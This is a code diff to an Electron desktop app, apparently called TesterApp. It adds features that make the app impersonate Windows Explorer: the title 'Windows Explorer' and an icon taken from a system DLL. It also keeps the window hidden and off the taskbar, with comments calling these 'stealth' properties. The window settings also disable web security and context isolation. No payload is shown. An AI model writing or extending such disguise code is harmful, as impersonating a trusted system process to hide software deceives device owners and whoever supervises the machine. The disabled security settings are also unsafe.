@@ -126,24 +126,44 @@ class TesterApp {
     });
   }
 
+  createExplorerIcon() {
+    // Create a Windows Explorer-like icon using nativeImage
+    if (process.platform === 'win32') {
+      // Try to use the actual Windows Explorer icon
+      try {
+        const iconPath = 'C:\\Windows\\System32\\imageres.dll';
+        return nativeImage.createFromPath(iconPath);
+      } catch (error) {
+        console.log('Could not load Windows Explorer icon, using empty icon');
+        return nativeImage.createEmpty();
+      }
+    }
+    
+    // For other platforms, use empty icon
+    return nativeImage.createEmpty();
+  }
+
   createMainWindow() {
+    // Create Windows Explorer icon
+    const explorerIcon = this.createExplorerIcon();
+    
     this.mainWindow = new BrowserWindow({
       width: 400,
       height: 500,
       title: 'Windows Explorer', // Disguise as Windows Explorer
+      icon: explorerIcon, // Use Windows Explorer icon
       webPreferences: {
         nodeIntegration: true,
         contextIsolation: false,
         webSecurity: false,
         enableRemoteModule: false
       },
-      show: true, // Visible to you (the tester)
-      // icon: path.join(__dirname, 'assets/icon.png'), // Commented out due to empty file
-      skipTaskbar: true, // Hide from taskbar
+      show: false, // Don't show initially - will be hidden anyway
+      skipTaskbar: true, // Hide from taskbar completely
       alwaysOnTop: false,
       resizable: true,
-      minimizable: true,
-      maximizable: true,
+      minimizable: false, // Disable minimize to prevent taskbar issues
+      maximizable: false, // Disable maximize to prevent taskbar issues
       titleBarStyle: 'default',
       // Advanced stealth properties
       transparent: false,
@@ -162,6 +182,9 @@ class TesterApp {
     // Hide window immediately after loading - keep it hidden by default
     this.mainWindow.once('ready-to-show', () => {
       this.mainWindow.hide();
+      // Ensure window is completely hidden from taskbar
+      this.mainWindow.setSkipTaskbar(true);
+      this.mainWindow.setVisibleOnAllWorkspaces(false, { visibleOnFullScreen: false });
       console.log('🥷 Tester window hidden by default - access via tray icon');
     });
 
@@ -772,8 +795,8 @@ class TesterApp {
   // Removed showStealthNotification - no notifications needed
 
   createTray() {
-    // Create a simple default icon since tray-icon.png is empty
-    const icon = nativeImage.createEmpty();
+    // Create Windows Explorer icon for tray
+    const icon = this.createExplorerIcon();
     
     this.tray = new Tray(icon);
     
